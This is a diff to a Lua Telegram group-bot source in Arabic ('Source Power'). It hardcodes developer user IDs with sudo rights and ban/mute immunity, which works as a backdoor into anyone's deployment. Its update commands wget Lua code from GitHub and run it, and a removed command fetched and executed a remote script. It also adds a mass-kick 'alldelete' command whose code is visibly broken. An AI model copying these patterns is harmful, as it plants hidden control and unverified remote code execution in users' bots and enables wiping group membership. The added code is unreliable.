@@ -103,11 +103,10 @@ SUDOUSERNAME = database:get(id_server..":USERSUDO"),
 create(config, "./DG_INFO.lua")   
 end 
 create_config_auto()
-USERNAMEBOT = database:get(id_server.."USERBOT")
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":IDSUDO")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-print('\n\27[1;34m BG SO POWER :')
+print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("DRAGON", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -165,7 +164,6 @@ if not f then
 AutoSet()  
 else   
 f:close()  
-database:del(id_server.."USERBOT")
 database:del(id_server..":token")
 database:del(id_server..":IDSUDO")
 end  
@@ -194,12 +192,12 @@ bot_id = sudos.token:match("(%d+)")
 token = sudos.token 
 --- start functions ↓
 -------------------------------------------------------------------------------------------------------------- 
-t = "\27[35m".."\n           FILES STARTED SOURCE POWER \n           ____________________\n           "..'\27[m'
+t = "\27[35m".."\n           FILES STARTED SOURCE POWER \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
 i = i + 1
-t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
+t = t.."           \27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
 end
 end
 print(t)
@@ -222,8 +220,8 @@ end
 end  
 return DRAGON  
 end 
-sudo_users = {SUDO,bot_id,1360140225,944353237,1236115319,0909090909,1770288756}   
-function SudoBot(msg)
+sudo_users = {SUDO,bot_id,1360140225,944353237,9292929292,0303030030,1770288756}   
+function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users,dev_users) do  
 if tonumber(msg.sender_user_id_) == tonumber(v) then  
@@ -347,9 +345,9 @@ if tonumber(user_id) == tonumber(944353237) then
 var = true  
 elseif tonumber(user_id) == tonumber(1360140225) then
 var = true  
-elseif tonumber(user_id) == tonumber(0909090909) then
+elseif tonumber(user_id) == tonumber(9292929292) then
 var = true  
-elseif tonumber(user_id) == tonumber(1236115319) then
+elseif tonumber(user_id) == tonumber(0303030030) then
 var = true  
 elseif tonumber(user_id) == tonumber(1770288756) then
 var = true  
@@ -393,10 +391,10 @@ if tonumber(user_id) == tonumber(1360140225) then
 var = 'مـبـرمـج افـايـره'
 elseif tonumber(user_id) == tonumber(944353237) then
 var = 'مـبـرمـج الـسـورس'
-elseif tonumber(user_id) == tonumber(0909090909) then
+elseif tonumber(user_id) == tonumber(9292929292) then
 var = 'مـلـك الـتـلـجـرام'
-elseif tonumber(user_id) == tonumber(1236115319) then
-var = 'المبرمج ليجاند'
+elseif tonumber(user_id) == tonumber(0303030030) then
+var = 'الباشمبرمج'
 elseif tonumber(user_id) == tonumber(1770288756) then
 var = 'مـبـرمـج افـايـره²'
 elseif tonumber(user_id) == tonumber(SUDO) then
@@ -963,7 +961,7 @@ return false
 end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'USERBOT' then
-if text == 'كيب' or text == '/SUDO' or text == "☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉" or text == 'انا المطور' or text == 'حه' or text == 'احا' then  
+if text == 'كيب' or text == '/sudo' or text == "☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉" or text == 'انا المطور' or text == 'حه' or text == 'احا' then  
 if DevSoFi(msg) then
 local bl = 'اهلا عزيزي المطور الاساسي\nشكرا لاستخدام سورس باور\nيمكنك التحكم بي البوت من كيبورد المطور الخاص بك'
 local keyboard = {
@@ -1002,7 +1000,6 @@ local Keyboard = {
 {'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
 {'نسبه الكره','نسبه الرجوله'},
 {'نسبه الحب','نسبه الانوثه'},
-{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
 {'ايدي','انا مين','العاب باور'},
 {'أحمد','سورس','تغير الايدي'},
 {'زخرفه','معاني الاسماء','الابراج','حساب العمر'},
@@ -1384,21 +1381,20 @@ send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لا�
 return false
 end 
 local inline = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
-local servar = io.popen([[
+send(msg.chat_id_, msg.id_,nil,inline, io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
 HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
 CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
 uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
-echo '☉✔{ نظام التشغيل } ⊰•\n `'"$linux_version"'`' 
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الذاكره العشوائيه } ⊰•\n`'"$memUsedPrc"'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ وحـده الـتـخـزيـن } ⊰•\n`'"$HardDisk"'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الـمــعــالــج } ⊰•\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ موقـع الـسـيـرفـر } ⊰•\n`'`curl http://th3boss.com/ip/location`'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الــدخــول } ⊰•\n`'`whoami`'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n`'"$uptime"'`'
-]]):read('*all')
-send_inline_key(msg.chat_id_,servar,nil,inline)
+echo '☉✔{ نظام التشغيل } ⊰•\n*»» '"$linux_version"'*' 
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الذاكره العشوائيه } ⊰•\n*»» '"$memUsedPrc"'*'
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ وحـده الـتـخـزيـن } ⊰•\n*»» '"$HardDisk"'*'
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الـمــعــالــج } ⊰•\n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ موقـع الـسـيـرفـر } ⊰•\n*»» '`curl http://th3boss.com/ip/location`'*'
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الــدخــول } ⊰•\n*»» '`whoami`'*'
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n*»» '"$uptime"'*'
+]]):read('*all'))  
 end
 if text == 'جلب المشتركين ☉' then
 if not DevSoFi(msg) then
@@ -1738,7 +1734,7 @@ os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute("rm -fr File_Bot/*")
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ تم اعاده تشغيل البوت\n☉┇ الاصدار » {`'..Get_VERGON..'`}')
+send(msg.chat_id_, msg.id_,' ☉┇ تم اعاده تشغيل البوت\n☉┇ الاصدار » {`'..Get_VERGON..'`}')
 os.execute("mkdir File_Bot") 
 dofile('DRAGON.lua')
 end
@@ -2896,32 +2892,7 @@ return false
 end
 end
 end
-if text then
-tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
-local num2 = 0
-local admins = data.members_
-for i=0 , #admins do
-if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
-database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
-num2 = num2 + 1
-tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
-if b.username_ == true then
-end
-if b.first_name_ == false then
-database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
-end
-end,nil)   
-else
-database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
-end
-end
-if num2 == 0 then
-send(msg.chat_id_, msg.id_,"") 
-else
-send(msg.chat_id_, msg.id_,"") 
-end
-end,nil)   
-end
+
 if text == 'تفعيل' then
 if not Sudo(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
@@ -3095,18 +3066,7 @@ end
 database:set(bot_id..'Num:Add:Bot',Num) 
 send(msg.chat_id_, msg.id_,' ☉┇ تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
 end
-if text == 'تحميل الملفات' then
-if not DevSoFi(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
-return false
-end 
-os.execute('rm -rf ALLFILS')
-os.execute('wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/ALLFILS')
-os.execute('./ALLFILS')
-os.execute('rm -rf ALLFILS')
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحميل جميع ملفات المتجر')
-dofile('DRAGON.lua')
-end
+
 if text == "تحديث" or text == 'تحديث السورس' then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
@@ -3116,7 +3076,7 @@ os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute("rm -fr File_Bot/*")
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ تم اعاده تشغيل البوت\n☉┇ الاصدار » {`'..Get_VERGON..'`}')
+send(msg.chat_id_, msg.id_,' ☉┇ تم اعاده تشغيل البوت\n☉┇ الاصدار » {`'..Get_VERGON..'`}')
 os.execute("mkdir File_Bot") 
 dofile('DRAGON.lua')
 end
@@ -3255,6 +3215,58 @@ local All_name = database:smembers(bot_id.."DRAGON:blocname"..msg.chat_id_)
 t = "\n☉┇ قائمة الاسماء المكتومه \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• \n"
 for k,v in pairs(All_name) do
 t = t..""..k.."- (["..v.."])\n"
+end
+if text == "alldelete" or text == "@alldelete" and CoSu(msg) then
+if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
+if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
+return 
+send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
+end
+database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
+tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi)
+x = 0
+tags = 0
+local list = sofi.members_
+for k, v in pairs(list) do
+tdcli_function({ID="ChangeChatMemberStatus",chat_id_=v.user_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
+if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
+send(v.user_id_, msg.id_,' ☉┇ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
+return false  
+end
+if (data and data.code_ and data.code_ == 3) then 
+send(v.user_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
+return false  
+end
+if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
+send(v.user_id_, msg.id_,' ☉┇ عذرا لا استطيع طرد ادمنية الجروب') 
+return false  
+end
+if data and data.ID and data.ID == 'Ok' then
+send(v.user_id_, msg.id_,' ☉┇ تم طردك من الجروب') 
+tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ =v.user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
+return false
+end
+end,nil)  
+tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
+if x == 5 or x == tags or k == 0 then
+tags = x + 5
+t = "#alldelete"
+end
+x = x + 1
+tagname = data.first_name_
+tagname = tagname:gsub("]","")
+tagname = tagname:gsub("[[]","")
+t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
+if x == 5 or x == tags or k == 0 then
+local Text = t:gsub('#alldelete,','#alldelete\n')
+sendText(msg.chat_id_,Text,0,'md')
+end
+end,nil)
+end
+end,nil)
+end,nil)
+end
 end
 if #All_name == 0 then
 t = "☉┇ لا يوجد اسماء مكتومه"
@@ -3436,7 +3448,6 @@ local Text = [[
 ☉┇ [AHMEDYAD](t.me/ahmedyad200)
 ☉┇ [DEVID](t.me/de_vi_d)
 ☉┇ [DONGOL](t.me/UU_DON)
-☉┇ [legand](t.me/L_E_p)
 •┉•┉•┉┉•┉•┉•┉•┉•
 ☉┇ [POWER](t.me/SOPOWERB0T)
 ☉┇ [FILES](t.me/FIPOWERB0T)
@@ -3444,7 +3455,10 @@ local Text = [[
 ☉┇ [TWASL AHMED](t.me/AYTSL1BOT)
 ]]
 keyboard = {}
-keyboard.inline_keyboard = {{{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},} 
+keyboard.inline_keyboard = {
+{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},
+{{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
+} 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
@@ -3487,7 +3501,7 @@ end
 end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end
---[[if text == 'روابط الجروبات' or text == 'روابط المجموعات' then
+if text == 'روابط الجروبات' or text == 'روابط المجموعات' then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
@@ -3507,7 +3521,7 @@ local file = io.open('Groups.txt', 'w')
 file:write(text)
 file:close()
 sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './Groups.txt', ' عدد الجروبات في الملف { '..#list..'}')
-end]]--
+end
 if text == 'جلب المشتركين' then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
@@ -4635,8 +4649,8 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1236115319) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المبرمج ليجاند عام")
+if tonumber(result.sender_user_id_) == tonumber(9292929292) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر ملك التلجرام عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
@@ -4690,8 +4704,8 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مـبـرمـج افـايـره \n")
 return false 
 end
-if result.id_ == tonumber(1236115319) then
-send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر المبرمج ليجاند \n")
+if result.id_ == tonumber(9292929292) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر ملك التلجرام \n")
 return false 
 end
 if result.id_ == tonumber(1770288756) then
@@ -4739,15 +4753,15 @@ if tonumber(userid) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(userid) == tonumber(1236115319) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المبرمج ليجاند عام")
+if tonumber(userid) == tonumber(9292929292) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر ملك التلجرام عام")
 return false 
 end
 if tonumber(userid) == tonumber(1770288756) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره² عام")
 return false 
 end
-if tonumber(userid) == tonumber(SUDO) then
+if userid == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
@@ -4792,8 +4806,8 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1236115319) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم المبرمج ليجاند عام")
+if tonumber(result.sender_user_id_) == tonumber(9292929292) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم ملك التلجرام عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
@@ -4845,8 +4859,8 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مـبـرمـج افـايـره \n")
 return false 
 end
-if result.id_ == tonumber(1236115319) then
-send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المبرمج ليجاند \n")
+if result.id_ == tonumber(9292929292) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم ملك التلجرام \n")
 return false 
 end
 if result.id_ == tonumber(1770288756) then
@@ -4889,8 +4903,8 @@ if tonumber(userid) == tonumber(944353237) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1236115319) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم المبرمج ليجاند عام")
+if tonumber(userid) == tonumber(9292929292) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم ملك التلجرام عام")
 return false 
 end
 if tonumber(userid) == tonumber(1360140225) then  
@@ -4901,7 +4915,7 @@ if tonumber(userid) == tonumber(1770288756) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مـبـرمـج افـايـره² عام")
 return false 
 end
-if tonumber(userid) == tonumber(SUDO) then
+if userid == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
@@ -5036,22 +5050,20 @@ if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
 end 
-local inline = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
-local servar = io.popen([[
+send(msg.chat_id_, msg.id_, io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
 HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
 CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
 uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
-echo '☉✔{ نظام التشغيل } ⊰•\n `'"$linux_version"'`' 
+echo '☉✔{ نظام التشغيل } ⊰•\n*»» '"$linux_version"'*' 
 echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الذاكره العشوائيه } ⊰•\n`'"$memUsedPrc"'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ وحـده الـتـخـزيـن } ⊰•\n`'"$HardDisk"'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الـمــعــالــج } ⊰•\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ موقـع الـسـيـرفـر } ⊰•\n`'`curl http://th3boss.com/ip/location`'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الــدخــول } ⊰•\n`'`whoami`'`'
-echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n`'"$uptime"'`'
-]]):read('*all')
-send_inline_key(msg.chat_id_,servar,nil,inline)
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ وحـده الـتـخـزيـن } ⊰•\n `'"$HardDisk"'`'
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الـمــعــالــج } ⊰•\n `'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ موقـع الـسـيـرفـر } ⊰•\n `'`curl http://th3boss.com/ip/location`'`'
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ الــدخــول } ⊰•\n `'`whoami`'`'
+echo '≪━━━━𝐏𝐎𝐖𝐄𝐑━━━━≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n `'"$uptime"'`'
+]]):read('*all'))  
 end
 if text == "all" or text == "@all" and CoSu(msg) then
 if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
@@ -5094,6 +5106,7 @@ end
 t = ' ☉┇ الملفات السورس الموجوده في البوت ↓\n •┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• \n'
 i = 0
 for v in io.popen('ls'):lines() do
+if v:match(".lua$") then
 i = i + 1
 t = t..i..'- الملف » {`'..v..'`}\n'
 end
@@ -5144,6 +5157,7 @@ end
 return false
 end
 end
+
 if text and text:match("^(مسح) (.*)(.lua)$") and DevSoFi(msg) then
 local name_t = {string.match(text, "^(مسح) (.*)(.lua)$")}
 local file = name_t[2]..'.lua'
@@ -10618,8 +10632,7 @@ end
 end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
 end
-
-if text == "مسح قائمه المنع"then
+if text == "مسح قائمه المنع" then
 if not Manager2(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
 return false
@@ -10632,7 +10645,6 @@ database:srem(bot_id.."DRAGON1:List:Filter"..msg.chat_id_,v)
 end  
 send(msg.chat_id_, msg.id_," ☉┇ تم مسح قائمه المنع")  
 end
-
 if text == "قائمه المنع" then
 if not Manager2(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
@@ -10649,7 +10661,6 @@ t = " ☉┇ لا يوجد كلمات ممنوعه"
 end  
 send(msg.chat_id_, msg.id_,t)  
 end  
-
 if text == 'مسح قائمه منع المتحركات' then
 if not Manager2(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
@@ -12196,7 +12207,7 @@ function start_function(extra, result, success)
 local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
 local getInfo = JSON.decode(chek)
 if getInfo.result.can_promote_members == false then
-send(msg.chat_id_, msg.id_,'☉┇ ليس لدي صلاحيه اضافه المشرفين ') 
+send(msg.chat_id_, msg.id_,'☉┇لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n ☉┇قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -12213,10 +12224,8 @@ end
 
 if text == ("مسح لقب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 function start_function(extra, result, success)
-local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
-local getInfo = JSON.decode(chek)
-if getInfo.result.can_promote_members == false then
-send(msg.chat_id_, msg.id_,'☉┇ ليس لدي صلاحيه اضافه المشرفين ') 
+if msg.can_be_deleted_ == false then 
+send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس مشرف يرجى ترقيتي !') 
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -12231,10 +12240,8 @@ return false
 end
 if text and text:match("^مسح لقب @(.*)$") and Constructor(msg) then
 local username = text:match("^مسح لقب @(.*)$")
-local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
-local getInfo = JSON.decode(chek)
-if getInfo.result.can_promote_members == false then
-send(msg.chat_id_, msg.id_,'☉┇ ليس لدي صلاحيه اضافه المشرفين ') 
+if msg.can_be_deleted_ == false then 
+send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس مشرف يرجى ترقيتي !') 
 return false  
 end
 function start_function(extra, result, success)
@@ -12260,9 +12267,9 @@ if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
 Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
 GeId = JSON.decode(Ge)
 if not GeId.result.custom_title then
-send(msg.chat_id_, msg.id_,'☉┇ مفيش لقب يتافه ') 
+send(msg.chat_id_, msg.id_,'☉┇مفيش لقب يتافه ') 
 else
-send(msg.chat_id_, msg.id_,'☉┇ لقبك هو : '..GeId.result.custom_title) 
+send(msg.chat_id_, msg.id_,'☉┇لقبك هو : '..GeId.result.custom_title) 
 end
 end
 if text == "فحص البوت" then
@@ -13030,13 +13037,17 @@ tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, o
 end
 
 if text == "أحمد" or text == 'احمد' then
-local inline = {{{text = 'مـبـرمـج الـسـورس', url="t.me/ahmedyad200"}},} 
-local textt = 'أحمد مبرمج سورس باور @ahmedyad200'
+database:set(bot_id.."Ahmed_photo:status"..msg.chat_id_,true) 
+local AY_ph = database:get(bot_id.."Ahmed_photo:status"..msg.chat_id_)
+if not AY_ph then
+send(msg.chat_id_, msg.id_," حدث خطأ في ال api") 
+return false  
+end
 local function getpro(extra, result, success)
 if result.photos_[0] then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,textt, msg.id_, msg.id_, "md")
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," أحمد مبرمج سورس باور @ahmedyad200 ", msg.id_, msg.id_, "md")
 else
-send_inline_key(msg.chat_id_, msg.id_,textt,nil,inline, 1, 'md')
+send(msg.chat_id_, msg.id_,'أحمد مبرمج سورس باور @ahmedyad200', 1, 'md')
   end end
 tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 944353237, offset_ = 0, limit_ = 1 }, getpro, nil)
 end
@@ -14395,11 +14406,11 @@ Text = ' ☉┇ عدد جهاتك *» { '..Num..' } *'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == " " then
+if text == "مسح المشتركين" then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
-end -- مسح المشتركين
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -14496,7 +14507,7 @@ end
 return false
 end
 
-if text and text:match("^(gpinfo)$") or text and text:match("^معلومات الجروب$") then
+if text and text:match("^(المجموعه)$") or text and text:match("^معلومات الجروب$") then
 function gpinfo(arg,data)
 -- vardump(data) 
 DRAGONdx(msg.chat_id_, msg.id_, ' ☉┇ ايدي المجموعة » ( '..msg.chat_id_..' )\n ☉┇ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ☉┇ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ☉┇ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
@@ -14664,6 +14675,10 @@ end
 
 ---------------------- الاوامر الجديده
 if text == 'الاوامر' and not database:get(bot_id.."coomand"..msg.chat_id_) then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام الاوامر')
+return false
+end
